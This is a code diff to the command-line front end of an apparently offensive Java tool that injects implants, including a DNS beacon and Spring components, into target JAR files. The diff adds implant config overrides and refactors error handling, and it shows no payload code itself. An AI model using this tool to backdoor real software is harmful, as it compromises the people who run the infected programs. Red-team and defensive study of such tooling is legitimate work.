@@ -115,6 +115,11 @@ public class Cli {
                 .help("Name of the Spring configuration class to use as a template in case the target Spring config needs to be modified. Only the '@Bean' annotated methods in this class will be copied to the target config.")
                 .choices("SpringImplantConfiguration")
                 .setDefault("SpringImplantConfiguration");
+        springInjectorParser.addArgument("-c", "--config")
+                .help("Override one or more configuration properties inside the implant. This will go into both parts of the implant, if available.")
+                .metavar("KEY=VALUE")
+                .nargs("*")
+                .type(String.class);
 
         Subparser implantListParser = subparsers.addParser("implant-list")
                 .help("List all bundled implants.")
@@ -159,7 +164,7 @@ public class Cli {
         } catch (ArgumentParserException e) {
             parser.handleError(e);
             System.exit(1);
-            throw new RuntimeException("Unreachable");
+            return;
         }
 
         // Set log level based on verbosity flags
@@ -200,13 +205,13 @@ public class Cli {
         if (implantClassName.equals("ClassImplant")) {
             try {
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
-            } catch (ClassNotFoundException | IOException e) {
+            } catch (ClassNotFoundException | IOException | ImplantException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
         } else if (implantClassName.equals("DnsBeaconImplant")) {
             try {
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(DnsBeaconImplant.class);
-            } catch (ClassNotFoundException | IOException e) {
+            } catch (ClassNotFoundException | IOException | ImplantException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
         } else {
@@ -227,8 +232,6 @@ public class Cli {
     }
 
     public static void runClassInjector(Path targetPath, Path outputPath, ImplantHandler implantHandler) {
-        ClassInjector injector = new ClassInjector(implantHandler);
-
         System.out.println(banner);
         System.out.println();
 
@@ -236,26 +239,34 @@ public class Cli {
         log.config("Target JAR: " + targetPath);
         log.config("Output JAR: " + outputPath);
 
-        log.fine("Reading available implant config properties...");
-        Map<String, ImplantHandlerImpl.ConfDataType> availableConfig = implantHandler.getAvailableConfig();
-        for (Map.Entry<String, ImplantHandlerImpl.ConfDataType> entry : availableConfig.entrySet()) {
-            log.fine(entry.getKey() + " (" + entry.getValue() + ")");
+        ClassInjector injector;
+        try {
+            injector = ClassInjector.createLoadedWith(implantHandler);
+        } catch (ImplantException e) {
+            log.severe(e.getMessage());
+            System.exit(1);
+            return;
         }
 
+        JarFiddler jar;
         try {
-            boolean didInfect = injector.infect(targetPath, outputPath);
-
-            if (didInfect) {
-                if (outputPath.equals(targetPath)) {
-                    log.info("Successfully spiked JAR '" + targetPath + "'.");
-                } else {
-                    log.info("Successfully spiked JAR '" + targetPath + "' -> '" + outputPath + "'.");
-                }
-            } else {
-                log.warning("Failed to spike JAR '" + targetPath + "'.");
-            }
+            jar = JarFiddler.buffer(targetPath);
         } catch (IOException e) {
-            throw new RuntimeException(e);
+            log.severe("Cannot read JAR '" + targetPath + "'.");
+            System.exit(1);
+            return;
+        }
+
+        boolean didInfect = injector.injectInto(jar);
+        if (didInfect) {
+            try {
+                jar.write(outputPath);
+                log.info("Successfully spiked JAR '" + targetPath + "'.");
+            } catch (IOException e) {
+                log.severe("Cannot write output JAR '" + outputPath + "'.");
+            }
+        } else {
+            log.warning("Failed to spike JAR '" + targetPath + "'.");
         }
     }
 
@@ -275,16 +286,28 @@ public class Cli {
             try {
                 componentHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantController.class);
                 springConfigHandler = ImplantHandlerImpl.findAndCreateFor(SpringImplantConfiguration.class);
-            } catch (ClassNotFoundException | IOException e) {
+            } catch (ClassNotFoundException | IOException | ImplantException e) {
                 throw new RuntimeException("Cannot find built-in implant class.", e);
             }
 
             Map<String, Object> configOverrides = parseConfigOverrides(namespace);
-            try {
-                componentHandler.setConfig(configOverrides);
-            } catch (ImplantConfigException e) {
-                System.err.println("Cannot set implant config: " + e.getMessage());
-                System.exit(1);
+            for (String availableConf : componentHandler.getAvailableConfig().keySet()) {
+                if (configOverrides.containsKey(availableConf)) {
+                    try {
+                        componentHandler.setConfig(availableConf, configOverrides.get(availableConf));
+                    } catch (ImplantConfigException e) {
+                        log.severe("Failed to set config property '" + availableConf + "' in implant Spring component.");
+                    }
+                }
+            }
+            for (String availableConf : springConfigHandler.getAvailableConfig().keySet()) {
+                if (configOverrides.containsKey(availableConf)) {
+                    try {
+                        springConfigHandler.setConfig(availableConf, configOverrides.get(availableConf));
+                    } catch (ImplantConfigException e) {
+                        log.severe("Failed to set config property '" + availableConf + "' in implant Spring configuration.");
+                    }
+                }
             }
 
             runSpringInjector(targetPath, outputPath, componentHandler, springConfigHandler);
@@ -295,8 +318,6 @@ public class Cli {
     }
 
     public static void runSpringInjector(Path targetPath, Path outputPath, ImplantHandler componentHandler, ImplantHandler springConfigHandler) {
-        SpringInjector injector = new SpringInjector(componentHandler, springConfigHandler);
-
         System.out.println(banner);
         System.out.println();
 
@@ -305,19 +326,38 @@ public class Cli {
         log.config("Target JAR: " + targetPath);
         log.config("Output JAR: " + outputPath);
 
+        SpringInjector injector;
         try {
-            boolean didInfect = injector.infect(targetPath, outputPath);
-            if (didInfect) {
-                if (outputPath.equals(targetPath)) {
-                    log.info("Successfully spiked JAR '" + targetPath + "'.");
-                } else {
-                    log.info("Successfully spiked JAR '" + targetPath + "'-> '" + outputPath + "'.");
-                }
-            } else {
-                log.warning("Failed to spike JAR '" + targetPath + "'.");
-            }
+            injector = SpringInjector.createLoadedWith(componentHandler, springConfigHandler);
+        } catch (ImplantException e) {
+            log.severe(e.getMessage());
+            System.exit(1);
+            return;
+        }
+
+        JarFiddler jar;
+        try {
+            jar = JarFiddler.buffer(targetPath);
         } catch (IOException e) {
-            throw new RuntimeException(e);
+            log.severe("Cannot read JAR '" + targetPath + "'.");
+            return;
+        }
+
+        boolean didInfect = injector.injectInto(jar);
+        if (didInfect) {
+            try {
+                jar.write(outputPath);
+            } catch (IOException e) {
+                log.severe("Cannot write output JAR '" + outputPath + "'.");
+                return;
+            }
+            if (outputPath.equals(targetPath)) {
+                log.info("Successfully spiked JAR '" + targetPath + "'.");
+            } else {
+                log.info("Successfully spiked JAR '" + targetPath + "'-> '" + outputPath + "'.");
+            }
+        } else {
+            log.warning("Failed to spike JAR '" + targetPath + "'.");
         }
     }
 
@@ -370,7 +410,7 @@ public class Cli {
                 ImplantInfo bundled = ImplantInfo.valueOf(implant);
                 implantHandler = ImplantHandlerImpl.findAndCreateFor(bundled.clazz);
                 System.out.println("Bundled implant '" + implant + "':");
-            } catch (ClassNotFoundException | IOException e) {
+            } catch (ClassNotFoundException | IOException | ImplantException e) {
                 throw new RuntimeException("Failed to read bundled implant: " + e.getMessage());
             } catch (IllegalArgumentException e) {
                 // This is Javas way of saying that no enum value was found
